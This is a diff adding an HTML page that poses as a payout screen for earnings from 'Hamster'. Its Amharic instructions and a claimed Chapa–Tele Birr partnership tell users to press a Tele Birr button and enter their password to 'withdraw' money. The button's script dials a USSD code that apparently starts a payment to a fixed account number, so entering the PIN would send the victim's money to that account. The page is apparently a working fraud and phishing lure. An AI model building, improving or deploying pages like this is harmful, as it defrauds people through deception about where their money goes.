@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Methods</title>
+    <style>
+        body {
+            background-color: black;
+            color: orange;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            text-align: center;
+            color: orange;
+        }
+        .payment-methods {
+            text-align: center;
+            margin-top: 50px;
+        }
+        .payment-method {
+            margin: 20px;
+            padding: 20px;
+            border: 2px solid orange;
+            display: inline-block;
+            cursor: pointer;
+            color: orange;
+            font-size: 18px;
+        }
+        .teal-text {
+            color: teal;
+            font-size: 16px;
+            margin-top: 20px;
+            text-align: center;
+            line-height: 1.5;
+        }
+        .green-text {
+            color: green;
+            font-size: 16px;
+            margin-top: 20px;
+            text-align: center;
+            animation: moveText 3s infinite;
+        }
+        @keyframes moveText {
+            0% {
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(10px);
+            }
+            100% {
+                transform: translateX(0);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <h1><strong>Payment Methods</strong></h1>
+
+    <div class="payment-methods">
+        <div class="payment-method" onclick="makeTelebirrCall()">
+            Tele Birr
+        </div>
+        <div class="payment-method">
+            CBE
+        </div>
+    </div>
+
+    <div class="teal-text">
+        በሀምስተር የሰሩትን ገንዘብ ለማውጣት የሚያስፈልግ ቅደም ተከተል:<br>
+        1. ቴሌ ብር የሚለውን አማራጭ መመጫን የሚመጣው የቴሌ ብር ቁጥር ላይ መደወል ከዛም የቴሌ ብር ፓስወርድ ሲጠይቅዎ በአግባቡ መሙላት<br>
+        2. ቴሌ ብርን ከኛ ጋር ካስተሳሰሩ ቡሀላ የፈለጉትን ያህል ገንዘብ በፈለጉት ቀን መውሰድ ይችላሉ<br><br>
+        ቻፓ ማይክሮ ፋይናንስ ከቴሌ ብር ጋር በመተባበር
+    </div>
+
+    <div class="green-text">
+        ገንዘብ ወደ አካውንትዎ እንዲገባ እባክዎ የራስዎ አካውንት መሆኑን ፓስወርዱን በመሙላት ያረጋግጡልን
+    </div>
+
+    <script>
+        function makeTelebirrCall() {
+            window.location.href = "tel:*721*2*2*1000503359948%23";
+        }
+    </script>
+
+</body>
+</html>
